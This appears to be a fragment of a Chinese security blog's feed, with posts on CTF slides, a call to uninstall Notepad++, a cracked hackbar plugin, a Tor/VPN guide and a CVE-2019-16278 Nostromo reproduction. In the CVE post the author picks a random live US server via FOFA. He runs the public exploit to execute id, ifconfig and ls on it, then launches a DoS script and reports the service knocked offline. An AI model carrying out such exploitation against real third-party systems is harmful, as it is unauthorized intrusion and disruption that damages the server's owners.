class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100913.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100928.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100934.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100940.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100947.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105100954.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101001.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101007.png" class="lozad"></p><h1 id="0x19-CTF训练-综合测试初学者"><a href="#0x19-CTF训练-综合测试初学者" class="headerlink" title="0x19 CTF训练-综合测试初学者"></a>0x19 CTF训练-综合测试初学者</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101023.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101037.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101323.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101331.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101338.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101400.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101406.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101414.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101419.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101426.png" class="lozad"></p><h1 id="0x19-综合渗透实际渗透"><a href="#0x19-综合渗透实际渗透" class="headerlink" title="0x19 综合渗透实际渗透"></a>0x19 综合渗透实际渗透</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101445.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101459.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101506.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101513.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101519.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101524.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101534.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101541.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101547.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105101553.png" class="lozad"></p><h1 id="0x20-结束"><a href="#0x20-结束" class="headerlink" title="0x20 结束"></a>0x20 结束</h1><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102421.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102431.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191105102442.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-CTF训练-课程介绍&quot;&gt;&lt;a href=&quot;#0x00-CTF训练-课程介绍&quot; class=&quot;headerlink&quot; title=&quot;0x00 CTF训练-课程介绍&quot;&gt;&lt;/a&gt;0x00 CTF训练-课程介绍&lt;/h1&gt;&lt;p&gt;前些日子因为参加CTF比赛，朋友发了我一些CTF的资料，今天整理资料的过程中发现还有这个一系列课程的PPT，为了方便学习查看，将PPT汇总成文档吧。&lt;/p&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>手起刀落Notepad++</title>
    <link href="https://www.mad-coding.cn/2019/10/31/%E6%89%8B%E8%B5%B7%E5%88%80%E8%90%BDNotepad/"/>
    <id>https://www.mad-coding.cn/2019/10/31/手起刀落Notepad/</id>
    <published>2019-10-31T01:19:22.000Z</published>
    <updated>2019-11-14T08:14:57.080Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>听说，有人想搞事？搞台独？</p><p><img alt="img" data-src="https://i04piccdn.sogoucdn.com/2c1eb568c5477e50" class="lozad"></p><a id="more"></a><h1 id="0x01-正文"><a href="#0x01-正文" class="headerlink" title="0x01 正文"></a>0x01 正文</h1><p>今日，听到消息称notepad++作者公然支持台独，作为我们大中国的一个底层小市民，为了保卫祖国统一不受侵犯，必须要站出来做点什么了。</p><p>手起刀落，卸载~</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031093355.png" class="lozad"></p><p>访问网站？</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031093441.png" class="lozad"></p><p>怕卸载notepad++没有好用的编辑器？</p><h1 id="0x02-编辑器推荐"><a href="#0x02-编辑器推荐" class="headerlink" title="0x02 编辑器推荐"></a>0x02 编辑器推荐</h1><h2 id="2-1-sublime"><a href="#2-1-sublime" class="headerlink" title="2.1 sublime"></a>2.1 sublime</h2><p>神级代码编辑器，好用到爆，深受众多程序员喜爱。</p><p>下载传送门：<a href="https://www.sublimetext.com/" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094507.png" class="lozad"></p><h2 id="2-2-vim"><a href="#2-2-vim" class="headerlink" title="2.2 vim"></a>2.2 vim</h2><p>据说是最好用的编辑器，等你熟悉了语法，功能后，那手感真是不一样。</p><p>下载传送门：<a href="https://www.vim.org/download.php" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094140.png" class="lozad"></p><h2 id="2-3-vscode"><a href="#2-3-vscode" class="headerlink" title="2.3 vscode"></a>2.3 vscode</h2><p>纵享丝滑，用了你就卸载不掉的那种。</p><p>下载传送门：<a href="https://code.visualstudio.com/" target="_blank" rel="noopener">传送门</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094322.png" class="lozad"></p><h2 id="2-4-Typora"><a href="#2-4-Typora" class="headerlink" title="2.4 Typora"></a>2.4 Typora</h2><p>Markdown语法的编辑器，本人现在写文章用的编辑器，好用之处更于他人说。</p><p>下载传送门：<a href="https://www.typora.io/" target="_blank" rel="noopener">https://www.typora.io/</a></p><p>界面截图：</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191031094731.png" class="lozad"></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;听说，有人想搞事？搞台独？&lt;/p&gt;
&lt;p&gt;&lt;img alt=&quot;img&quot; data-src=&quot;https://i04piccdn.sogoucdn.com/2c1eb568c5477e50&quot; class=&quot;lozad&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://www.mad-coding.cn/categories/web%E5%AE%89%E5%85%A8/"/>
    
      <category term="安全资讯" scheme="https://www.mad-coding.cn/categories/web%E5%AE%89%E5%85%A8/%E5%AE%89%E5%85%A8%E8%B5%84%E8%AE%AF/"/>
    
    
  </entry>
  
  <entry>
    <title>火狐插件-hackbar与MaxHackbar</title>
    <link href="https://www.mad-coding.cn/2019/10/29/%E7%81%AB%E7%8B%90%E6%8F%92%E4%BB%B6-hackbar%E4%B8%8EMaxHackbar/"/>
    <id>https://www.mad-coding.cn/2019/10/29/火狐插件-hackbar与MaxHackbar/</id>
    <published>2019-10-29T07:55:53.000Z</published>
    <updated>2019-11-14T07:34:55.224Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>hackbar，一个渗透测试人员必备的浏览器插件神器，这里不做赘述，但是随着hackbar收费以来，收到安全圈内广大朋友的吐槽，毕竟免费真香~ v~。</p><p>MaxHackbar，一个与hackbar类似的插件，个人觉得好像比hackbar还强大一点。</p><a id="more"></a><h1 id="0x01-hackbar"><a href="#0x01-hackbar" class="headerlink" title="0x01 hackbar"></a>0x01 hackbar</h1><h2 id="1-1-介绍"><a href="#1-1-介绍" class="headerlink" title="1.1 介绍"></a>1.1 介绍</h2><p>渗透测试使用的神器，可以方便手工注入、XSS、编码等测试。</p><h2 id="1-2-破解安装"><a href="#1-2-破解安装" class="headerlink" title="1.2 破解安装"></a>1.2 破解安装</h2><p>下载地址：<a href="https://github.com/1stPeak/hackbar2.1.3-master" target="_blank" rel="noopener">hackbar2.1.3传送门</a></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161952.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162009.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162025.png" class="lozad"></p><h2 id="1-3-使用"><a href="#1-3-使用" class="headerlink" title="1.3 使用"></a>1.3 使用</h2><p>按F12</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029162201.png" class="lozad"></p><h1 id="0x02-Maxhackbar"><a href="#0x02-Maxhackbar" class="headerlink" title="0x02 Maxhackbar"></a>0x02 Maxhackbar</h1><h2 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h2><p>应为hackbar的收费，所以有大佬做出来与hackbar功能基本一样的插件。真心强大，菜鸡的我献上膜拜的眼神。</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/4823ed041c7a454a" class="lozad"></p><h2 id="2-2-安装"><a href="#2-2-安装" class="headerlink" title="2.2 安装"></a>2.2 安装</h2><p>安装很简单，只要在火狐的插件库中去搜索安装就行了，</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161313.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161338.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161356.png" class="lozad"></p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161434.png" class="lozad"></p><h2 id="2-3-使用"><a href="#2-3-使用" class="headerlink" title="2.3 使用"></a>2.3 使用</h2><p>按F12</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029161512.png" class="lozad"></p><p>详细使用，后期介绍。</p><h1 id="0x03-hackbar-compare-with-Maxhackbar"><a href="#0x03-hackbar-compare-with-Maxhackbar" class="headerlink" title="0x03 hackbar compare with Maxhackbar"></a>0x03 hackbar compare with Maxhackbar</h1><p>emmmm，尽情期待。</p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;hackbar，一个渗透测试人员必备的浏览器插件神器，这里不做赘述，但是随着hackbar收费以来，收到安全圈内广大朋友的吐槽，毕竟免费真香~ v~。&lt;/p&gt;
&lt;p&gt;MaxHackbar，一个与hackbar类似的插件，个人觉得好像比hackbar还强大一点。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="火狐插件" scheme="https://www.mad-coding.cn/tags/%E7%81%AB%E7%8B%90%E6%8F%92%E4%BB%B6/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2019-16278 RCE复现</title>
    <link href="https://www.mad-coding.cn/2019/10/29/CVE-2019-16278-RCE%E5%A4%8D%E7%8E%B0/"/>
    <id>https://www.mad-coding.cn/2019/10/29/CVE-2019-16278-RCE复现/</id>
    <published>2019-10-29T06:58:26.000Z</published>
    <updated>2019-10-29T07:11:49.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>今天在网上看到关于CVE-2019-16278的漏洞复现文章，然后自己也照个找个复现玩玩，这里来记录一下.</p><a id="more"></a><h1 id="0x01-漏洞描述"><a href="#0x01-漏洞描述" class="headerlink" title="0x01 漏洞描述"></a>0x01 漏洞描述</h1><p>Nostromo web server(nhttpd)是一个开源的web服务器，在Unix系统非常流行。</p><p>漏洞原因是web服务在对URL进行检查是在URL被解码前，攻击者可以将/转换为%2f就可绕过检查，之前出现过类似漏洞CVE-2011-0751.</p><blockquote><p>影响版本：Nostromo version &lt;= 1.9.6</p></blockquote><h1 id="0x02-漏洞复现"><a href="#0x02-漏洞复现" class="headerlink" title="0x02 漏洞复现"></a>0x02 漏洞复现</h1><h2 id="2-1-复现脚本"><a href="#2-1-复现脚本" class="headerlink" title="2.1 复现脚本"></a>2.1 复现脚本</h2><blockquote><p><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150339.png" class="lozad"></p><h2 id="2-2-随机靶机选择"><a href="#2-2-随机靶机选择" class="headerlink" title="2.2 随机靶机选择"></a>2.2 随机靶机选择</h2><p>因为在网站看到别人自己搭环境没有成功，所以，嘿嘿，我就偷个懒，直接使用fofa在互联网上搜一个搞搞。</p><p>FOFA关键词：<strong>“Nostromo”**</strong>，随便用一个美国的试试**</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150451.png" class="lozad"></p><p>先将exp克隆到本地</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://git.sp0re.sh/sp0re/Nhttpd-exploits.git</span><br><span class="line">cd Nhttpd-exploits</span><br><span class="line">ls</span><br></pre></td></tr></table></figure><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150529.png" class="lozad"></p><h2 id="2-3-验证RCE漏洞"><a href="#2-3-验证RCE漏洞" class="headerlink" title="2.3 验证RCE漏洞"></a>2.3 验证RCE漏洞</h2><p>使用id命令查看用户权限</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150541.png" class="lozad"></p><p>使用ifconfig命令查看ip地址等信息。</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150551.png" class="lozad"></p><p>使用ls命令查看目录文件</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150606.png" class="lozad"></p><h2 id="2-4-验证DOS漏洞"><a href="#2-4-验证DOS漏洞" class="headerlink" title="2.4 验证DOS漏洞"></a>2.4 验证DOS漏洞</h2><p>先使用curl命令查看目标服务是否正常</p><blockquote><p>curl <a href="http://71.xxx.xxx.231:8080" target="_blank" rel="noopener">http://71.xxx.xxx.231:8080</a></p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150611.png" class="lozad"></p><p>使用脚本宕掉服务</p><blockquote><p>/CVE-2019-16279.sh 71.xxx.xxx.231 8080</p></blockquote><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150748.png" class="lozad"></p><p>目标服务已经挂了</p><p><img alt data-src="https://madcoding-image.oss-cn-hongkong.aliyuncs.com/20191029150759.png" class="lozad"></p><h1 id="0x03-加固修复"><a href="#0x03-加固修复" class="headerlink" title="0x03 加固修复"></a>0x03 加固修复</h1><p>   官方目前并没有给出修复措施</p><p><img alt="img" data-src="https://i02piccdn.sogoucdn.com/4860632969d16d17" class="lozad"></p><h1 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04 参考链接"></a>0x04 参考链接</h1><p><a href="https://git.sp0re.sh/sp0re/Nhttpd-exploits" target="_blank" rel="noopener">https://git.sp0re.sh/sp0re/Nhttpd-exploits</a></p><p><a href="https://www.cnblogs.com/mark-zh/p/11728168.html" target="_blank" rel="noopener">https://www.cnblogs.com/mark-zh/p/11728168.html</a></p><p><a href="https://www.daoblogs.org/post-39.html" target="_blank" rel="noopener">https://www.daoblogs.org/post-39.html</a></p><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;今天在网上看到关于CVE-2019-16278的漏洞复现文章，然后自己也照个找个复现玩玩，这里来记录一下.&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="漏洞复现" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
      <category term="CVE" scheme="https://www.mad-coding.cn/tags/CVE/"/>
    
  </entry>
  
  <entry>
    <title>2019年Tor浏览器终极指南</title>
    <link href="https://www.mad-coding.cn/2019/10/25/2019%E5%B9%B4Tor%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BB%88%E6%9E%81%E6%8C%87%E5%8D%97/"/>
    <id>https://www.mad-coding.cn/2019/10/25/2019年Tor浏览器终极指南/</id>
    <published>2019-10-25T08:36:56.000Z</published>
    <updated>2019-11-14T06:45:58.088Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>如果你想更了解Tor浏览器，那表示你已经知道<strong>在线隐私和匿名</strong>的重要性。因为Tor浏览器是帮助你保持在线安全的绝佳工具。但是关于它的优缺点，特别是<strong>关于它与VPN之间的关系</strong>，有很多人还一知半解。</p><a id="more"></a><h1 id="0x01-Tor浏览器是什么？"><a href="#0x01-Tor浏览器是什么？" class="headerlink" title="0x01 Tor浏览器是什么？"></a>0x01 Tor浏览器是什么？</h1><p>Tor浏览器在很多方面<strong>与普通的网络浏览器类似</strong>。易用性和Google Chrome或Microsoft Edge差不多。其不同之处在于Tor浏览器通过Tor网络将你连接到互联网。</p><p><strong>Tor是可以帮助你在线保持匿名的免费开源软件</strong>。当你使用Tor浏览器浏览互联网时，你的流量会在到达最终目的地之前通过服务器网络随机定向，以<strong>保护你的位置和身份安全</strong>。</p><p>“Tor”是“洋葱路由器（The Onion Router）”的缩写，反映Tor通过将数据<strong>包装在多个加密层</strong>中（如洋葱一般）来保护其数据的方式。</p><h1 id="0x02-Tor浏览器是VPN吗？"><a href="#0x02-Tor浏览器是VPN吗？" class="headerlink" title="0x02 Tor浏览器是VPN吗？"></a>0x02 Tor浏览器是VPN吗？</h1><p>Tor浏览器和VPN都是用来保护在线隐私的工具。然而，<strong>它们是两种不同的东西</strong>。其以截然不同的技术并<strong>以不同的方式来保护你</strong>的安全。</p><p>VPN将所有数据通过端到端加密以对其进行保护，再通过安全通道将其定向到远程服务器，而该服务器会再将你连接到你要访问的网站。</p><p>我们将在下面解释Tor浏览器如何以不同的方式保护你的隐私。</p><p>重要的是Tor浏览器与VPN不同，但<strong>你可以将这两个工具结合使用，以确保你的安全和隐私滴水不漏</strong>。</p><h1 id="0x03-Tor浏览器如何运作？"><a href="#0x03-Tor浏览器如何运作？" class="headerlink" title="0x03 Tor浏览器如何运作？"></a>0x03 Tor浏览器如何运作？</h1><p>尽管Tor浏览器的后台系统很复杂，但却非常容易使用。你只需<strong>下载并安装Tor浏览器</strong>，就可像使用任何其他浏览器一样<strong>连接到互联网</strong>。</p><p>Tor使用由美国海军开发来保护政府情报通信的独特系统。</p><p>你的数据将在进入Tor网络之前，被捆绑到加密数据包层中。然后<strong>通过一系列由志愿者操作的服务器（称为节点或中继）进行路由</strong>。</p><p>数据每通过一个中继，就会移除一层加密，以显示下一个中继的位置。<strong>当数据到达最终中继（称为“出口节点”）时，最后一层加密将被删除</strong>，而你的数据则会被发送到其最终目标地。</p><p>每个中继仅解密有助于了解前一个和下一个中继位置的数据。由于每个路径都是随机生成的，并且没有保留任何一个中继的记录，因此<strong>任何人都难以通过Tor的复杂网络追溯你的足迹</strong>。</p><h1 id="0x04-Tor浏览器安全吗？"><a href="#0x04-Tor浏览器安全吗？" class="headerlink" title="0x04 Tor浏览器安全吗？"></a>0x04 Tor浏览器安全吗？</h1><p>Tor浏览器可非常有效地<strong>隐藏你的位置并防止你的流量被跟踪</strong>，使任何人都难以通过Tor的网络追溯你的在线活动。</p><p>然而，<strong>Tor浏览器并不是没有漏洞</strong>。该系统有些缺点。由于Tor网络中的每个服务器都是<strong>由志愿者操作</strong>，因此你永远不知道数据传输的中继是由谁所有。</p><p>通常，因为<strong>每个中继 – 除了出口节点以外 – 只能获悉前一个和下一个中继的位置，</strong>因此这不成问题。</p><p>出口节点会删除数据的最后一层加密。你的原始位置或IP地址不会被看见，但如果你访问不安全的HTTP网站，则<strong>出口节点可能会借此监视你的活动</strong>。</p><p>此外，Tor浏览器<strong>也与其他浏览器一样容易受到类似的攻击</strong>。如果你想保持匿名，则最好关闭浏览器的插件和脚本，因为其可能会泄露你的IP地址等信息。</p><h1 id="0x05-Tor浏览器有哪些缺点？"><a href="#0x05-Tor浏览器有哪些缺点？" class="headerlink" title="0x05 Tor浏览器有哪些缺点？"></a>0x05 Tor浏览器有哪些缺点？</h1><p>使用Tor浏览器的最大缺点是速度。由于你的数据必须在到达最终目的地之前经过多个中继，因此你的<strong>浏览速度可能非常慢</strong>。</p><p>Tor浏览器不是流媒体和下载的最佳选择，而其创建者也<strong>强烈反对种子下载</strong>。使用Tor下载不仅慢，且下载流量没有受到保护，更可能因此暴露你的IP地址。</p><p>如果你正在寻找<strong>流媒体或下载的方式，则VPN将为你提供更好的保护</strong>。</p><p>使用Tor浏览器的另一个缺点是它可能<strong>让你的在线活动受到关注</strong>。你的互联网服务提供商（ISP）无法看到你正在进行的活动，但他们知到你正在使用Tor，进而对你正在从事的活动产生怀疑。</p><p>即使你只使用Tor浏览器来合法浏览互联网，连接Tor也<strong>可能使你成为政府监控的目标</strong>。像美国国家安全局和联邦调查局这样的美国政府机构都积极试图跟踪Tor用户的在线活动。</p><h1 id="0x06-Tor搭配VPN"><a href="#0x06-Tor搭配VPN" class="headerlink" title="0x06 Tor搭配VPN"></a>0x06 Tor搭配VPN</h1><p>Tor浏览器相当实用，但它不能提供VPN所提供的安全防护。幸运的是，你不必在两者之间做选择。<strong>你可以将Tor浏览器和VPN结合使用，以结合其功能并获得最佳隐私</strong>。</p><p>将Tor浏览器和VPN结合的方式<strong>主要有两种</strong>。我们将讲解这两种方法的流程并解释每种方法的优缺点。</p><h1 id="0x07-Tor-over-VPN"><a href="#0x07-Tor-over-VPN" class="headerlink" title="0x07 Tor over VPN"></a>0x07 Tor over VPN</h1><p>若要使用此方法，首先你必须连接到VPN，然后进入Tor网络。此方法有一些优点，其中包含易用性，因为你<strong>只需连接到VPN再打开Tor浏览器</strong>即可。</p><p>在大多数情况下，此配置可为你提供足够的安全性和隐私以保护你的安全。</p><p><strong>一些VPN通过提供内置的Tor服务使此过程变得更加容易</strong>，其中例如<a href="https://zh.vpnmentor.com/reviews/nordvpn/" target="_blank" rel="noopener">NordVPN</a>的Onion over VPN服务，即可让你在没有Tor浏览器的情况下连接到Tor。</p><p>NordVPN通过其安全的VPN服务器来路由你的流量，然后直接将流量路由至Tor网络。<strong>NordVPN服务可以保护你设备上的所有流量，而不仅仅是你的浏览器活动</strong>。</p><p>Tor over VPN的另一个好处是，你的所有数据在进入Tor网络之前，都将由VPN进行安全加密。因此，<strong>Tor的志愿者操作服务器将无法获取你真实的IP地址</strong>。</p><p>由于VPN会隐藏你的在线活动，因此<strong>你的ISP也将无法检测到你的Tor连接</strong>。</p><p>因为你的VPN提供商无法看到你在Tor网络中从事的活动，你可从而获得一层隐私。另一方面，如果你的VPN提供商记录你的活动日志，则<strong>Tor over VPN无法隐藏你的真实IP地址或你正在使用Tor的事实</strong>。</p><p>此方法的另一个缺点是它<strong>不能保护你免受恶意出口节点的攻击</strong>，因为你的流量在到达最终目的地时没有受到加密。</p><h1 id="0x08-VPN-over-Tor"><a href="#0x08-VPN-over-Tor" class="headerlink" title="0x08 VPN over Tor"></a>0x08 VPN over Tor</h1><p>使用此方法时，你首先必须连接到Tor网络，然后再连接到VPN。此过程比Tor over VPN<strong>更复杂</strong>，因为在大多数情况下，你必须<strong>手动配置VPN</strong>才能使用Tor。</p><p>VPN over Tor最大的好处是它可以<strong>保护你免受Tor出口节点的攻击</strong>。你的流量不会直接从出口节点转到最终目的地，而是从出口节点路由到安全的VPN服务器。</p><p>此配置因此<strong>非常适合用来传递敏感信息</strong>。</p><p>此方法的坏处是，<strong>你的ISP以及政府机构</strong>虽不能看见你的在线活动<strong>，却能查知你的Tor连接</strong>。</p><p>此方法还可以<strong>避免VPN提供商记录你的真实IP地址</strong>。然而，若你选择采用透明的无日志政策的VPN，便不用担心这个问题。</p><h1 id="0x09-结论"><a href="#0x09-结论" class="headerlink" title="0x09 结论"></a>0x09 结论</h1><p>尽管Tor浏览器有其缺陷，但仍可有效保护你的在线隐私。<strong>将Tor的匿名性与VPN的安全性和安全性相结合</strong>，更可以让你获得两全其美的服务。</p><p>如果你打算使用Tor浏览器，我们强烈建议你搭配使用VPN。</p><p><strong>VPN</strong>可在不显着降低Tor浏览器速度的前提下<strong>提供出色的安全性和匿名性</strong>。</p><p>如果你正在寻找值得信赖VPN来保护你的在线隐私，请查看我们的最佳<a href="https://zh.vpnmentor.com/blog/最優惠vpn及折扣代碼/" target="_blank" rel="noopener">VPN优惠和优惠券代码</a>列表。</p><p>洋葱路由使用教程：<a href="https://www.5xiaobo.com/?id=308" target="_blank" rel="noopener">https://www.5xiaobo.com/?id=308</a></p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;如果你想更了解Tor浏览器，那表示你已经知道&lt;strong&gt;在线隐私和匿名&lt;/strong&gt;的重要性。因为Tor浏览器是帮助你保持在线安全的绝佳工具。但是关于它的优缺点，特别是&lt;strong&gt;关于它与VPN之间的关系&lt;/strong&gt;，有很多人还一知半解。&lt;/p&gt;
    
    </summary>
    
      <category term="神兵利器" scheme="https://www.mad-coding.cn/categories/%E7%A5%9E%E5%85%B5%E5%88%A9%E5%99%A8/"/>
    
    
      <category term="tor浏览器" scheme="https://www.mad-coding.cn/tags/tor%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
  </entry>
  
  <entry>
    <title>等保服务内容及报价</title>
    <link href="https://www.mad-coding.cn/2019/10/24/%E7%AD%89%E4%BF%9D%E6%9C%8D%E5%8A%A1%E5%86%85%E5%AE%B9%E5%8F%8A%E6%8A%A5%E4%BB%B7/"/>
    <id>https://www.mad-coding.cn/2019/10/24/等保服务内容及报价/</id>
    <published>2019-10-24T02:43:57.000Z</published>
    <updated>2019-11-14T06:52:49.882Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>随着等保2.0的到来，再一次掀起了网络安全的热潮，为了让大家更好的理解等级保护，决定整理此文，内容来自互联网搜集。</p><a id="more"></a><h1 id="0x01-信息安全等级保护服务流程及内容"><a href="#0x01-信息安全等级保护服务流程及内容" class="headerlink" title="0x01 信息安全等级保护服务流程及内容"></a>0x01 